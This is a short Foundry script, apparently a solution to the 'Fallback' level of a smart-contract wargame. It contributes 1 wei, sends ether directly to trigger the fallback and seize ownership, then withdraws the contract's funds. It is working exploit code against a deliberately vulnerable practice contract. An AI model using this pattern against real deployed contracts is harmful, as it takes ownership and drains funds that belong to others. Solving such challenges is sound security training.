// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level01.sol";

contract POC is Test {
    Fallback level01 = Fallback(payable(vm.envAddress("INSTANCE")));

    function run() external {
        vm.startBroadcast();

        level01.contribute{value: 1 wei}();
        level01.getContribution();

        (bool success, ) = address(level01).call{value: 1 wei}("");
        require(success, "Transfer failed!");

        level01.owner();
        level01.withdraw();

        vm.stopBroadcast();
    }
}
